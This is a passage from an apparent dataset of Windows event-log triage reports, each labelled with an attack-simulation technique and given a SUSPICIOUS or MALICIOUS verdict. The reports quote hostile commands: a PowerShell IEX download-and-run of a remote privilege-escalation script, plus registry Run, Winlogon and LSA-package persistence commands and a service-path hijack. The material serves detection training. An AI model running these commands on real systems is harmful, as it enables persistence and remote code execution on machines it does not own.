  - Potential misuse if executed by an unauthorized user or compromised account.

#### Sysmon Log Analysis
- Several `Sysmon` EventID 5 (Process Termination) and EventID 1 (Process Creation) are logged:
  - Processes like `powershell.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` are involved.
  - The use of PowerShell, especially with the involved script, needs scrutiny to ensure it aligns with expected admin practices.
  - `wevtutil.exe` and `whoami.exe` usage suggests system management and querying operations, potentially typical of admin activity. 

The high integrity level of these processes and their execution by the `SERVER002\admin_test` user suggests they could be authorized activities. However, the presence of tool executions (such as `whoami.exe`) could be indicative of reconnoitering if used by an unauthorized actor. 

#### Application and Security Log Analysis
- Application logs provide no significant entries that suggest compromise.
- There are no security logs present in the data provided, which limits the insights into logons and other security-related activities.

### Conclusion
Based on the analysis:
- **System logs** show normal update activity.
- **PowerShell logs** show legitimate, but caution-required, credential management.
- **Sysmon logs** recorded typical system and administrative processes but stress checking credential and script uses.

### Resolution
**SUSPICIOUS** - Although most activities align with legitimate administrative tasks, the script execution in PowerShell involving password handling and the numerous PowerShell launches warrant further investigation to confirm that:
- The actions were indeed authorized by a legitimate administrator.
- The scripting does not expose security flaws or potential misuse.

### Recommendations
- Verify the owner and legitimate use of scripts executing PowerShell activities.
- Conduct a credential audit for the `admin_test` account to ensure no unauthorized use.
- Implement security measures for scripts managing credentials, such as code reviews, logging, and restricted execution policies.

Proceed with these steps to ensure the host's security integrity and expand the investigation if authorization or security flaws are discovered."
Parent PID Spoofing - Spawn from New Process,"### Analysis of the Logs

#### Application Log
- The provided entry is from the ""Software Protection Platform Service"" indicating a common application log with warning level specific to event ID 16394. This event typically relates to the state of the software protection service and doesn’t directly indicate any suspicious activity or threat on its own.

#### PowerShell Log
- Several PowerShell Event ID 600 logs indicate a PowerShell session starting with the execution of the following command: 
  ```
  powershell.exe & {Start-Process -FilePath $Env:windir\System32\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10'}
  ```
  - **Start-Process**: Launching Notepad using PowerShell is generally benign. However, the subsequent pipe to **Start-ATHProcessUnderSpecificParent** and then PowerShell execution might indicate an attempt to execute something under a specified process, which could be anomalous. This command sequence does not appear typical and could hint at an attempt to perform process injection or hide PowerShell activity under a seemingly benign process.
- The complex PowerShell command use does raise suspicion given the obfuscation technique post-Notepad execution.

#### Sysmon Log
- A series of Sysmon Event IDs with notable attention on Event ID 1 and 5, suggesting process creation and termination activities:
  - A notable instance of interest is the use of **wevtutil.exe** and **conhost.exe** executed multiple times under the same user `admin_test`, which seems like legitimate maintenance operation. However, the correlation with running PowerShell commands raises questions about intent.
  - **wevtutil.exe** is a legitimate Windows utility to manage event logs. Frequent usage in quick succession alongside the other observations may suggest log tampering or clearance activity, particularly if the user lacks administrative tasks aligning with such operations.
  - **PowerShell.exe** executed from **wsmprovhost.exe** could indicate remote administration activity which isn't inherently malicious but usually merits context checking to verify legitimacy.

#### Security Log and System Log
- Both logs are empty or lack events for analysis in this precise instance. It's important to note missing logs, especially the Security logs, given their relevance in determining unauthorized access.

### Assessment and Conclusion
- The combination of the PowerShell activities including obfuscation techniques, and the use of the wevtutil and conhost, suggest behavior that deviates from normally expected activities, especially in the absence of transparent intended maintenance or administrative tasks.
- The lack of entries in Security logs could raise concern, especially if events have been selectively deleted to hide unauthorized actions.

### Resolution
Considering the complex PowerShell activity, use of utility commands possibly to mask operations, and absence of Security logs:

- **Resolution: SUSPICIOUS**

### Recommendation
- Conduct further investigation to confirm activity context:
  - Verify the operations performed by `admin_test` during the timeline to identify whether they align with legitimate maintenance or operational tasks.
  - Check for similar entries or abnormalities across other machines.
  - Monitor for repeated or continued suspicious activity.
- Consider limiting PowerShell capabilities or enforcing script signing to mitigate potential risks.
- Review system integrity and check for any unauthorized changes."
Winlogon Notify Key Logon Persistence - PowerShell,"Upon reviewing the provided logs, I will highlight potentially suspicious activities or indicators of compromise:

### Analysis:

#### Windows PowerShell Logs:
1. **Suspicious Use of Registry Modifications:**
   - The PowerShell logs show multiple events with commands executed to modify Windows Registry entries specifically under `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\file`.
   - The operations being performed include creating a new registry key and setting properties like `DllName`, `Logon`, `Impersonate`, and `Asynchronous`.
   - The `DllName` is pointing to a DLL in the `C:\Windows\Temp\` directory, which is uncommon for legitimate applications and can be an indicator of a malware persistence mechanism.

#### Security Logs:
1. **Time and System Locale Changes:**
   - There are logs indicating slight time changes (`EventID 4616`), which might not directly indicate malicious activity but could relate to confusion in log timing during an attack.
   - The process involved in changing the system time is `svchost.exe`, a legitimate system process, generally not suspicious unless associated with other indicators.

#### Sysmon Logs:
1. **Execution of wevtutil.exe and conhost.exe:**
   - The execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` without a clear context might raise concerns, especially if accompanied by other suspicious events. `wevtutil.exe` is a legitimate tool but is sometimes used for clearing event logs to cover tracks.
2. **Execution of PowerShell:**
   - The logs show PowerShell being used to execute the aforementioned script that modifies the Winlogon registry keys, indicating a possible attempt to use PowerShell for persistence or malicious configurations.

#### System and Application Logs:
- The logs in the System and Application channels show typical behavior with no explicit signs of compromise.

### Conclusion:
Given the presence of registry modifications that are typically associated with malware persistence mechanisms and the use of directories like `C:\Windows\Temp\` for storing and referencing DLLs, these logs demonstrate signs of potentially **malicious activity**.

### Resolution:
- **MALICIOUS**: The actions observed in the PowerShell logs, particularly the registry modifications and the unusual use of a temporary directory for a DLL, are strongly indicative of malicious activity.

### Guidance:
- **Immediate Response:**
  - Isolate the affected machine (`Server002`) to prevent spread or further compromise.
  - Conduct a detailed forensic analysis to understand the full scope of the breach.
  - Check the integrity and origin of the `fileNotificationPackage.dll` in `C:\Windows\Temp\`.
  - Review user activity for `SERVER002\admin_test` to identify any unauthorized actions or accesses.
  - If possible, capture memory and disk images for deeper analysis and evidential purposes.

- **Remediation Steps:**
  - Remove or restore the compromised registry entries under the Winlogon Notify path.
  - Perform a full antivirus/malware scan on `Server002`.
  - Review and tighten security policies around PowerShell script execution and registry changes.
  - Educate users on recognizing phishing attempts or other attack vectors, as user action is often involved in initial compromise.

By determining the nature of these activities as malicious, prompt actions can minimize damage and prevent further vulnerabilities."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"Upon reviewing the provided Windows event logs, the following observations and analyses are made:

1. **Microsoft Edge Installer Activity (Sysmon logs)**
   - The logs indicate the execution of a Microsoft Edge installer (`setup.exe`). This activity, given the image path and descriptions, appears to be legitimate software update activity for Microsoft Edge by Microsoft Corporation. 
   - No suspicious patterns were found in this entry. 

2. **PowerShell Activity with Elevated Privileges (Sysmon and PowerShell logs)**
   - There are multiple instances of PowerShell being executed by the user `SERVER002\admin_test`. One entry highlights a complex command involving the import of `MSOnline` and `AzureAD` modules, along with credential handling in an automated script. 
   - The specifics of this command include resetting user passwords and adding a user to the ""Company Administrator"" and ""Global Reader"" roles in Azure AD. 
   - Although PowerShell is often used legitimately, this particular script reflects actions commonly associated with unauthorized privilege escalation and account manipulation.

3. **Wevtutil.exe and Conhost.exe Activity (Sysmon logs)**
   - The `wevtutil.exe` tool is used for managing event logs, and the presence of multiple `conhost.exe` entries indicates possible handling of console Windows.
   - These actions are normal but can be suspicious if not warranted by regular administrative tasks or expected system management activities. Given frequent execution tied to the user `SERVER002\\admin_test`, it could be part of the automated script or manual monitoring activity.

4. **CompatTelRunner.exe Activity (Security logs)**
   - CompatTelRunner.exe provides telemetry data for compatibility, and multiple entries are logged with high frequency.
   - Typically, telemetry should not access account-specific actions, suggesting unusual behavior when tied to user enumeration.

5. **Privileged Account Operations (Security logs)**
   - Security logs indicate actions initiated by `CompatTelRunner.exe` that enumerated across accounts such as `Administrator`, `Guest`, `admin_test`, `DefaultAccount`, and several built-in groups.
   - There are entries indicating successful login and privilege assignment to SYSTEM tasks, further signifying potential misuse or system reconnaissance activities.

**Summary and Resolution:**

- The PowerShell activity involving credential manipulation and Azure role assignments is directly suspicious and, combined with potentially unauthorized account enumeration and privilege querying indicated by CompatTelRunner.exe, represents a high likelihood of malicious activity.
- This does not conform to regular system operation patterns and suggests potential compromise or misuse intended for privilege escalation and reconnaissance.

**Resolution:** MALICIOUS

**Recommendations:**

1. **Immediate Response Actions:**
   - Address the PowerShell script usage and user account (admin_test) for unauthorized changes.
   - Isolate the affected system (Server002) to prevent further actions until it can be properly investigated and remediated.

2. **Further Investigation:**
   - Audit administrative and domain controller account logs around the noted time.
   - Review related network activity or unauthorized data access logs.
  
3. **Remediation Steps:**
   - Reset passwords for accounts potentially involved or affected.
   - Conduct a comprehensive security assessment and apply security updates and hardening procedures."
Modify Service to Run Arbitrary Binary (Powershell),"Upon analyzing the provided Windows logs, several details stand out that suggest potentially malicious activity. Here's a breakdown of the suspicious elements:

### 1. Windows PowerShell Log
- **Events 1043 to 1049**: The PowerShell script executed on this host is suspicious. It involves stopping the ""fax"" service, changing its binary path to Notepad.exe (`set-servicebinarypath -name ""fax"" -path ""$env:windir\\system32\\notepad.exe""`), and restarting it. This is a known technique used by malware to establish persistence or execute unauthorized code by subverting a legitimate service's configuration. 

### 2. Security Log
- **Events 30349-30350**: These entries record system time changes by the `svchost.exe` process. While time adjustments are not uncommon, when paired with other suspicious activity like the PowerShell changes, it could indicate an attempt to manipulate or evade time-based detection mechanisms.

### 3. Application Log
- **Events 2383-2384**: These logs record errors associated with Microsoft Fax, which aligns with the PowerShell manipulation of the fax service. Altering a service's executable path and corresponding errors could indicate a failed or troublesome attempt to execute malicious operations.

### 4. Sysmon Log
- **Event 17979**: This entry records the execution of a PowerShell instance with a command line similar to the PowerShell logs, confirming that the suspicious script was actually run.
  
- **Events involving `SERVICES` like `C:\Windows\System32\wevtutil.exe`, `C:\Windows\System32\conhost.exe`, and `C:\Windows\System32\whoami.exe`**: These are common utilities and benign on their own. However, they should be assessed contextually if they're executed by unusual or unauthorized users.

### Conclusion
The combination of PowerShell service manipulation, time adjustments, and resulting errors is indicative of potential malicious intent. Changing a service's binary path to execute a different program is commonly used in malicious activities to bypass security controls without triggering traditional alerts by using process names commonly associated with the service. This behavior is characteristic of persistence techniques or privilege escalation attempts.

### Resolution
Based on the suspicious manipulation of the fax service through PowerShell and the resulting application errors, and considering the possible aim to subvert system operations:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Isolation and Investigation**: Isolate the affected system to prevent potential lateral movement within the network.
2. **Forensic Investigation**: Conduct a deeper forensic analysis to determine the full scope and impact, including identifying additional artifacts or changes to the system.
3. **Threat Hunting**: Perform threat hunting for similar activities across the network to identify any other potentially compromised systems.
4. **Patch and Harden**: Ensure that all systems are updated, and review service permissions to prevent unauthorized modifications.
5. **Review and Enhance Monitoring**: Adjust monitoring and alerting to detect service manipulation and related signatures in the future.

These steps will help mitigate the immediate threat posed by this activity and enhance overall security readiness against similar tactics."
Import XML Schedule Task with Hidden Attribute,"Based on the provided logs, let's analyze the notable activities and determine if there are any indicators of malicious activity:

### PowerShell Logs
1. **PowerShell Invocation**: The logs display the execution of a PowerShell script that reads an XML file (`data_05_SCTASK_HIDDEN_ATTRIB.xml`) and registers a scheduled task using the `Invoke-CimMethod` with `RegisterByXml` method.

   - **File Path**: The file is located in a temporary directory, which could potentially be used for obfuscation or temporary malicious activities.
   - **Scheduled Task Manipulation**: Registering scheduled tasks via PowerShell, especially from a non-standard location like this, can be indicative of malicious behavior aiming to establish persistence.

### Sysmon Logs
1. **Process Executions**:
   - **PowerShell Process**: Sysmon logs confirm the execution of a PowerShell process with command lines that are consistent with the PowerShell logs.
   - **Wevtutil Executions**: The use of `wevtutil.exe` frequently may signal log clearing activities, which are often associated with an attempt to cover tracks.
   - **WMI Provider Host**: The execution of `WmiPrvSE.exe` can be normal, but it can also be used for lateral movement or persistence if manipulated outside typical parameters.

2. **User Activity**: The activity is predominantly associated with `SERVER002\admin_test`. While it's reasonable for an admin account to perform such actions, the combination of scheduled task registration involving temporary files and execution of administrative commands should be closely scrutinized.

### Application Log
1. **Software Protection Platform Service**: Only records a standard entry without any behavior signaling suspicious activity in isolation.

### Assessment
- **Anomalous PowerShell Usage**: The use of PowerShell to create or modify scheduled tasks using a potentially hidden XML file is suspicious. Leveraging PowerShell in combination with temporary files for scheduled tasks can be used to inject, persist, or elevate payload execution in an environment.
  
- **Multiple Process Start Events of Potentially Administrative Tools**: We see `conhost.exe` associated with processes, which can be a common behavior, but alongside `wevtutil.exe` it requires suspicion as it is commonly used in conjunction with script and logging activities.

### Conclusion: SUSPICIOUS
The combination of PowerShell activity, scheduled task manipulation using temporary XML files, and the use of utilities like `wevtutil.exe` warrants a categorization of this activity as ""SUSPICIOUS"". Further investigation is necessary to capture:
- The contents of the XML file being read and registered.
- The context for the execution of `wevtutil.exe` during the same timeframe.
- Verification of intended admin activity reality from `SERVER002\admin_test` as it relates to current known operations or presence on the network.

### Recommended Next Steps
1. **Isolate and Capture**:
   - Ensure the integrity and obtain a copy of the XML file for analysis.
   - Review historical scheduled task actions related to this user and system.
   
2. **Review Process Ancestry**:
   - Check preceding log entries related to process creation and scheduled task registration around the mentioned timestamp.

3. **Immediate Review of Endpoint by Security Team**:
   - Conduct endpoint security checks including scanning for indicators of compromise (IoCs) that might relate to known threats using similar methods.

4. **Network Traffic Analysis**:
   - Examine recent network traffic from `Server002` for unusual communication that might relate to data exfiltration or command-and-control activities.

Taking these steps will help determine the nature of this suspicious activity and confirm or dismiss potential compromise."
Shortcut Modification,"Based on the logs provided, here is a detailed analysis focusing on any suspicious or potentially malicious activities:

1. **Windows PowerShell Log**: Unfortunately, the Windows PowerShell logs section is missing, or not provided. PowerShell logs would have provided more context on script executions, which can often indicate suspicious or malicious activities.

2. **Security Logs (Event ID 4616)**: These events indicate a change in the system time by the system process `svchost.exe`, running under `NT AUTHORITY\LOCAL SERVICE`. While changing system time can sometimes be a tactic used by malware to evade time-based security controls, it can also often occur during legitimate operations. Given the absence of additional context, this in itself does not conclusively indicate malicious activity without further supporting evidence.

3. **Application Logs**: These logs show standard activities such as service updates and stops related to Microsoft Edge Update. These activities seem to be benign and generally associated with routine software updates.

4. **Sysmon Logs**:
   - There are several cases of benign processes being executed, like `whoami.exe`, `hostname.exe`, and `conhost.exe`, which could be part of routine system administration or scripting tasks.
   - However, there is a specific command in Sysmon that deserves attention: A command executed by `cmd.exe` to create a URL shortcut file pointing to `calc.exe`. The command `cmd.exe /c echo [InternetShortcut] > %temp%\data.009_modified_shortcut.url & echo URL=C:\windows\system32\calc.exe >> %temp%\data.009_modified_shortcut.url & %temp%\data.009_modified_shortcut.url` appears out of place. Using such a technique to execute another process can be indicative of an attempt to bypass normal execution paths or obfuscate actions.
   - The execution of `calc.exe` (Windows Calculator) from a URL shortcut in the temporary directory, as shown in the logs, is a known tactic used in penetration testing and can sometimes be a form of process masquerading or exploitation attempt.

5. **System Logs**: Indicate regular kernel and time synchronization activities. These do not appear suspicious on their own.

### Conclusion

- **Identified Suspicious Activity**: The command that creates and uses a URL shortcut to invoke `calc.exe` is atypical and warrants suspicion. While `calc.exe` itself is benign, the method of invocation is suspect and could represent an obfuscation technique.
- **Recommendation**: Further investigation is required. Collect context around processes related to `cmd.exe` during the period, check for any unauthorized access, and explore if this corresponds with any user activity that might explain the command’s purpose.

**Resolution**: **SUSPICIOUS** - This activity needs more investigation to determine if the technique was used maliciously or if there's a legitimate explanation."
`SeDebugPrivilege` token duplication,"Upon reviewing the provided Windows event logs, I have identified several points of interest that indicate potentially suspicious and malicious activity on the host computer (Server002). Here’s the detailed analysis:

### Indicators of Suspicious or Malicious Activity:

1. **Unusual PowerShell Execution:**
   - There is a `Sysmon EventID 1` log indicating the execution of `powershell.exe` with a suspicious command line: 
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/script/script/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/script.ps1' -UseBasicParsing); script -Technique Token -Verbose}
     ```
   - This command downloads and executes a PowerShell script directly from a remote source (GitHub) using `Invoke-Expression (IEX)` and `Invoke-WebRequest (IWR)`, which is a common technique for executing potentially harmful scripts.

2. **Time Change Events:**
   - Security and System logs (EventID 4616 and 1 respectively) show the system time being set backwards:
     ```
     PreviousTime: 2024-10-25 11:26:02.3389001
     NewTime: 2024-10-25 11:25:57.2893260
     ```
   - This behavior can indicate attempts to manipulate logs or hide the true sequence of events, commonly seen in malicious activities.

3. **Process Execution Patterns:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\\admin_test`. Although these utilities are legitimate, their use in rapid succession by an administrative user suggests potential log clearing or command line operations.

4. **High Integrity Operations:**
   - The processes, particularly `PowerShell`, are running with a High Integrity level, suggesting administrative privileges were employed. This aligns with the possibility of privilege escalation attempts.

### Assessment and Conclusion:

- **Threats or Risks Identified:**
  - **Malicious PowerShell Script Execution:** The direct downloading and execution of a script from an external source without any verification poses a significant security risk.
  - **Time Manipulation:** Adjustments to the system time can disrupt the integrity of logging, making it difficult to trace actions accurately.

### Recommended Actions:

1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further potential spread or communication with the attacker.
   
2. **Forensic Analysis:** Perform a deeper forensic analysis on Server002 to understand what actions the PowerShell script took and identify any files or changes it made to the system.

3. **Log Verification:** Verify the integrity of the logs, especially around the timeframe of the suspicious activities, to ensure no further tampering occurred.

4. **Patching and Updates:** Ensure all systems, especially PowerShell, have the latest security updates and consider implementing enhanced logging such as script block logging to capture detailed script executions.

5. **Policy and Monitoring Adjustments:** Implement stricter execution policies (like allowing only signed scripts) and enhance monitoring to identify and alert on similar behaviors in the future.

### Resolution:
**Resolution: MALICIOUS** - The presence of a suspicious and potentially harmful PowerShell invocation and unusual system actions suggests the system was compromised by malicious activity. Further investigation is recommended to determine the full impact and extent of the compromise."
Process Hollowing in Go using CreateProcessW WinAPI,"Upon analyzing the provided Windows event logs, here are the findings in terms of potential malicious activity or compromise indicators:

### Analysis:

1. **System Logs:**
   - The time changes noted in the logs (`EventID 1` and `EventID 24` in Kernel-General) indicate adjustments in time settings. This could be a result of legitimate time synchronization tasks, likely corrected by `ntp` (Network Time Protocol) using `time.windows.com`. 

2. **Sysmon Logs (EventID 5 & 1):**
   - Frequent executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test` indicate that these commands might be part of a script or automated task.
   - The command line in the process using `powershell.exe` suggests execution of `CreateProcess.exe` with the `werfault.exe` program with debug privileges. This is unusual since `werfault.exe` is the Windows Error Reporting tool and typically used for reporting crashes.
   - The process `CreateProcess.exe` executed with elevated integrity level through Powershell can be suspicious if unexpected, as it might indicate exploitation or privilege escalation attempt.

3. **Windows PowerShell Logs:**
   - Repetitive execution entries of PowerShell with a script loading `CreateProcess.exe` also indicate suspicious behavior since this may imply an attempt to run processes under certain conditions potentially to avoid detection.

4. **Security Logs (EventID 4624, 4672, 4616):**
   - The logon and the special privileges granted to user `admin_test` are observed. `SeDebugPrivilege` and similar can be of particular interest if the administrative purpose of this account and actions were not explicitly approved.

5. **Application Logs:**
   - No direct indicators of malware execution or compromise were observed, apart from the one Software Protection Platform (SPP) logging standard actions.

### Assessment:

Based on the analysis:
- The frequent, unusual creation of `CreateProcess.exe` along with `werfault.exe`, especially initiated from `powershell.exe`, raises a degree of suspicion for malicious intentions or compromise. It does not appear associated with a well-known or documented benign batch operation.
- Execution of processes related to edge updates and system services seems benign, corresponding to routine updates from Microsoft Edge and Windows services. 

### Resolution:

The activities observed in this log analysis lean towards suspicious rather than definitively malicious or benign. Therefore, I determine the resolution as:

**- SUSPICIOUS -**

### Guidance:

1. **Further Investigation:**
   - Conduct a deeper investigation into the purpose and origin of the `CreateProcess.exe` files found in the temporary directories.
   - Confirm the necessity and legitimacy of the administrative PowerShell scripts executed by `admin_test`.
   - Review access logs and network activity for any related anomalous burst of data, external communication during these activities.
   - If authorized, consider deploying more robust detection measures or endpoint monitoring to understand the behavior of identified processes over time.

2. **Remedial Actions:**
   - If the processes involved are confirmed to be unnecessary, consider disabling associated scripts or configurations.
   - Discuss with the system administration team the potential need for additional user permission monitoring or restriction, especially with regard to the use of elevated privilege tokens or scripts.

Taking the above steps will help in adequately addressing any potential risks associated with the activities recorded in these logs."
Winlogon HKLM Shell Key Persistence - PowerShell,"Upon review of the provided logs from the Windows host, several observations can be made:

**1. Application Log:**
- The entries related to the ""Software Protection Platform Service"" do not provide sufficient information on any abnormal activity. There is no indication of a compromise here.

**2. System Log:**
- The System log entries show normal system events like time changes managed by ""svchost.exe"" and updates from the time server. These logs do not provide evidence of malicious behavior or compromise on their own.

**3. Windows PowerShell Log:**
- There is a suspicious PowerShell command execution:
  - `Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force`
  - This modifies the registry key often associated with shell configurations to run an additional `cmd.exe` alongside `explorer.exe`, potentially opening a command prompt automatically upon logon. This type of modification can be used to maintain persistence for an attacker.
  
**4. Sysmon Log:**
- Multiple references to legitimate binaries (`whoami.exe`, `hostname.exe`) and processes (`WindowsPowerShell`, `conhost.exe`) running under the `SERVER002\admin_test` account. However, the suspicious PowerShell command is highlighted by the image and command line entries. 
- Execution of `wevtutil.exe` by the `SERVER002\admin_test` user is logged, which might indicate log manipulation or enumeration activities if not performed for legitimate administrative tasks.
   
**5. Security Log:**
- Normal time change activities are logged, with no signs of account anomalies or unauthorized access attempts.

**Assessment and Conclusion:**
The presence of the PowerShell command to alter the Winlogon shell parameter is a clear indicator of potentially malicious activity. This behavior is generally not observed in legitimate administrative tasks and could indicate an attempt to maintain persistent access or tamper with startup processes.

**Threat or Risk Identified:**
- The modification of the registry to alter the login shell behavior is risky and suggests unauthorized attempts to execute further commands via `cmd.exe` upon user logon.

**Guidance on How to Proceed:**
- Further investigation is warranted to determine the source and intent of the PowerShell command.
- Examine the user account `admin_test` for unauthorized access or misuse.
- Conduct a full malware scan and verify the integrity of system files.
- Review additional logs for similar patterns or associated behaviors.
- Consider resetting registry changes back to default and monitor for recurring changes.
- Audit security policies and potentially educate users regarding phishing attempts or social engineering tactics that may have led to this event.

**Resolution: MALICIOUS** - The command altering the system's behavior to run additional potentially unauthorized processes is a strong indicator of malicious activity."
Reg Key Run,"Based on the analysis of the provided Windows event logs, I have identified several events that warrant further attention:

1. **Time Manipulation**:
   - Multiple events in both the System and Security logs show changes to the system time by the `svchost.exe` process. While this could be part of legitimate operations, altering system time can also be a tactic used by attackers to evade detection or bypass time-based security mechanisms.

2. **Registry Modification**:
   - The Sysmon logs show the execution of `cmd.exe` which subsequently runs `reg.exe` to add an entry to the registry at `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The added entry points to a file `C:\Path\file.exe`. This kind of behavior is indicative of persistence mechanisms used by malware to ensure it executes upon system startup.

3. **Suspicious Process Activity**:
   - There is a series of Sysmon events recording the use of administrative tools (`wevtutil.exe`, `whoami.exe`, and `cmd.exe`) by the user `admin_test`. The chain of events, particularly the execution of `cmd.exe` for registry modification, suggests potential misuse that could be manually executed by an attacker or automated by malware.

4. **High Integrity Level Processes**:
   - Processes such as `whoami.exe` and `cmd.exe` were executed with High Integrity Level privileges, which could offer elevated permissions for carrying out potentially harmful activities.

After taking into account these indicators and the context of the activities, the assessment of the situation is as follows:

- **Detected Threats/Risks**: 
  - Possible unauthorized system time manipulation.
  - Registry modification for persistence.
  - Execution of administrative tools which can be indicative of lateral movement or reconnaissance activities.

- **Overall Assessment**: The presence of system time manipulation alongside registry modifications for persistence are red flags for potential malicious activity. Given that multiple suspicious activities are linked, although they may have a legitimate explanation, they need a thorough investigation to rule out malicious intent.

- **Resolution**: The overall resolution for the situation is **SUSPICIOUS**. 

### Guidance on How to Proceed:
1. **Immediate Investigation**:
   - Verify the source and intent of the time changes. Confirm whether it was part of scheduled system maintenance or unauthorized actions.
   - Investigate `C:\Path\file.exe` involved in the registry modifications to determine its origin, functionality, and legitimacy.
   - Check for additional persistence mechanisms beyond registry modifications.
   - Validate user `admin_test` activities to ensure they align with expected behaviors.

2. **System Monitoring**:
   - Monitor for repeated execution of similar commands or activities by the user `admin_test`, focusing on unusual patterns compared to normal behavior.

3. **Security Controls**:
   - Ensure antivirus and endpoint detection systems are up to date and configured to catch potential compromises.
   - Consider tightening controls on how administrators or elevated users can execute scripts and access critical system processes.

4. **Audit Trail**:
   - Keep a comprehensive record of logs and investigation results for review if further escalation is required.

Conclusively, the activities observed align with tactics used by potential attackers, thus necessitating further detailed investigation to prevent compromise."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"Upon reviewing the provided log entries from various Windows event logs, I've identified the following observations:

### Key Observations:

1. **Repeated Use of Sysinternals Tools**: 
   - There are multiple invocations of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. Using these utilities isn't inherently suspicious, but frequent or automated usage might warrant further investigation to determine the purpose (such as clearing event logs).

2. **PowerShell Execution**:
   - The PowerShell logs indicate a command was executed to manipulate registry settings and sequentially launch `runonce.exe`. Specifically, `Set-ItemProperty` was used to change the `Version` property in the registry under `Active Setup`, followed by `runonce.exe`. Such behavior could be indicative of persistence mechanisms often employed by malware to execute on system startup.
  
3. **Elevation and Execution Context**:
   - Several processes, especially within `Microsoft Edge Update`, are run under `NT AUTHORITY\SYSTEM`, which provides the highest level of access. While these entries seemingly relate to legitimate updates, verifying that these updates were expected and validated through checksums could resolve any ambiguity.

4. **Time Discrepancies in Logs**:
   - There are records of system time adjustments. Events `4616` in the Security log and associated entries in the System log suggest that time setting operations took place. This could be benign, possibly due to time synchronization with a time server, but if unexpected, it should be examined as altering system time can be used to bypass time-based security logs.

5. **Normal System Operations**:
   - Many entries, such as those involving `TrustedInstaller.exe`, `svchost.exe`, and Microsoft Edge updates, indicate standard system operations.

### Conclusion:

The log entries contain elements that warrant further investigation, particularly concerning PowerShell usage which manipulated registry entries to set up a persistence method using `runonce.exe`. The repetitive utility execution might reflect automated tasks, possibly aligned with system maintenance or something more suspicious if unexpected. Moreover, time changes noted in the logs should be verified against authorized administrative actions or scheduled synchronization tasks.

### Recommendation:

- **Resolution**: **SUSPICIOUS**
- **Next Steps**:
  - Investigate the purpose and origin of PowerShell scripts executed by `admin_test`, especially regarding registry modifications and runonce execution.
  - Verify the legitimacy of the `Microsoft Edge Update` process chain. Confirm with logged changes to ensure it's expected behavior.
  - Review user `admin_test` activities around the log times to ascertain whether these align with authorized tasks.
  - Check for any other unusual activities or alerts around the system time alterations.

Considering these observations will help clarify whether the activities are authorized processes or if they indicate a potential compromise or risky system state."
Authentication Package,"### Detailed Analysis

#### Observations:
1. **System Logs:**
   - Multiple system time changes (event ID 1 from `Microsoft-Windows-Kernel-General`), although changes in system time can be legitimate (e.g., time synchronization), they can be suspicious if they occur frequently or if there are discrepancies in time settings without proper context.

2. **Sysmon Logs:**
   - The execution of `powershell.exe` with the command line indicating a suspicious operation:
     ```shell
     Copy-Item ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\package.dll"" C:\\Windows\\System32\\, reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f
     ```
     Such operations involve copying a DLL to the `System32` directory and manipulating registry keys related to authentication packages, which is often indicative of malicious activity, specifically indicative of attempts to install a malicious DLL for privilege escalation or persistence.

   - The high integrity level (`High`) for processes executed under the user `SERVER002\admin_test` further points toward potential misuse of elevated privileges.

   - Usage of `wevtutil.exe` and `conhost.exe` is normal, but their execution can be suspicious depending on the context, such as whether they are attempting to clear logs or being initiated by unexpected parent processes.

3. **Security Logs:**
   - Privilege assignments (Event ID 4672) highlight that the user `admin_test` has obtained high privileges, which could hint that this account might be compromised if its actions seem abnormal.

4. **Windows PowerShell Log:**
   - The PowerShell logs correlate with the Sysmon logs, indicating the execution of potentially malicious scripts.

5. **Application Logs:**
   - Routine entries were found for the `edgeupdate` service stopping but did not appear to directly contribute to the suspected malicious activities based on system context.

#### Suspicious/Malicious Activity:
- The PowerShell command that copies a DLL to the system directory and modifies registry keys underlines potentially malicious intent, likely related to persistence or privilege escalation.
- Processes with high integrity levels involved in unexpected operations suggest potential misuse of administrative privileges.

### Conclusion

Overall, the logs present several indicators of deceptive operations, notably through PowerShell scripts handling potentially malicious DLLs and registry changes.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Isolation:**
   - Isolate the host `Server002` from the network to prevent further spread or communication of a potential compromise.
   
2. **Detailed Forensic Analysis:**
   - Conduct a thorough forensic investigation on the `Server002` to identify and mitigate any backdoors or additional payloads that may have been installed.
   
3. **Audit and Reset Credentials:**
   - Reset credentials, especially for `admin_test`, and monitor for unusual login activities across all systems.
   
4. **Registry and DLL Checks:**
   - Inspect the registry for suspicious entries and verify the integrity of DLL files in critical system directories.
   
5. **Update Security Measures:**
   - Ensure all software is up to date with the latest security patches, and consider deploying enhanced endpoint detection and response measures.

LockBit Black - Modify Group policy settings -Powershell,"After a thorough analysis of the logs provided, several observations can be made:

### Anomalous Activities:
1. **PowerShell Activity:**  
   - The logs indicate a PowerShell execution that involves setting registry keys under `HKLM:\SOFTWARE\Policies\Microsoft\Windows\System`, with properties related to Group Policy RefreshTime and SmartScreen settings. This script execution is suspicious as it makes changes to sensitive settings without any clear justification. Changing such settings could potentially weaken security features.

2. **Execution of `wevtutil.exe`:**  
